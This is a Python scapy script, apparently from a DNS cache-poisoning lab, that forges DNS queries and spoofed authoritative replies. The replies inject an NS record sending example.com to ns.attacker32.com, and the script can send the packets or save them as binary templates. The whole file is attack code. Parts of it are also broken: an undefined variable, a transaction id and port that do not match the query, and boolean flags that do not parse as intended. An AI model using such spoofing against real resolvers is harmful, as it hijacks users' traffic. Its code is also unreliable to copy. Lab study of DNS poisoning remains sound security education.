#!/usr/bin/env python3 

from argparse import ArgumentParser
from scapy.all import send, IP, UDP, DNS, DNSQR, DNSRR


def query():
    ip = IP(dst='10.9.0.53', src='10.9.0.11')
    udp = UDP(dport=53, sport=33333 ,chksum=0)
    dns = DNS(id=0xAAAA, qr=0, qdcount=1,
              ancount=0, nscount=0, arcount=0,
              qd=DNSQR(qname='www.example.com'))
    return ip/udp/dns

def reply():
    domain = "example.com"
    ip = IP(dst='10.9.0.53', src='10.11.0.9')
    udp = UDP(dport=3333, sport=53, chksum=0)
    dns = DNS(id=0xAAA, aa=1, rd=1, qr=1,
              qdcount=1, ancount=1, nscount=1, arcount=0,
              qd=DNSQR(qname=name),
              an=DNSRR(rrname='www.' + domain, type='A', rdata='1.2.3.4', ttl=259200),
              ns=DNSRR(rrname=domain, type='NS', rdata='ns.attacker32.com', ttl=259200))
    return ip/udp/dns

def log(type='q'):
    def query():
        ip = IP(dst='10.9.0.53', src='1.2.3.4')
        udp = UDP(dport=53, sport=12345, chksum=0)
        dns = DNS(id=0xAAAA, qr=0,
                  nscount=0, ancount=0, arcount=0,
                  qdcount=1, qd=DNSQR(qname='twysw.example.com'))
        return ip/udp/dns

    def reply():
        domain = 'example.com'
        ip = IP(dst='10.9.0.53', src='199.43.133.53', chksum=0)
        udp = UDP(dport=33333, sport=53, chksum=0)
        dns = DNS(id=0xAAAA, aa=1, ra=0, rd=1, cd=0, qr=1,
                  qdcount=1, ancount=1, nscount=1, arcount=0,
                  qd=DNSQR(qname='twysw.' + domain),
                  an=DNSRR(rrname='twysw.' + domain, type='A', rdata='1.2.3.4', ttl=259200),
                  ns=DNSRR(rrname=domain, type='NS', rdata='ns.attacker32.com', ttl=259200))
        return ip/udp/dns

    filename, packet = ('ip_req.bin', query()) if type == 'q' else\
                       ('ip_resp.bin', reply())
    with open(filename, 'wb') as f:
        f.write(bytes(packet))


if __name__ == '__main__':
    A = ArgumentParser()
    A.add_argument('-q', '--query', nargs='?', type=bool, default=True, help='DNS query')
    A.add_argument('-r', '--reply', nargs='?', type=bool, default=False, help='DNS reply')
    A.add_argument('-l', '--log', nargs='?', type=bool, default=True, help='Log DNS packets')
    A.add_argument('-s', '--send', nargs='?', type=bool, default=False, help='Send DNS requests')
    args = A.parse_args()

    args.query = False if args.reply else args.query # args.reply overrides args.query
    if not (args.query or args.reply):
        raise Exception('Invalid usage: Specify DNS request type (query/reply)')

    if args.send:
        send(query() if args.query else reply(), verbose=0)

    if args.log:
        log('q' if args.query else 'r')
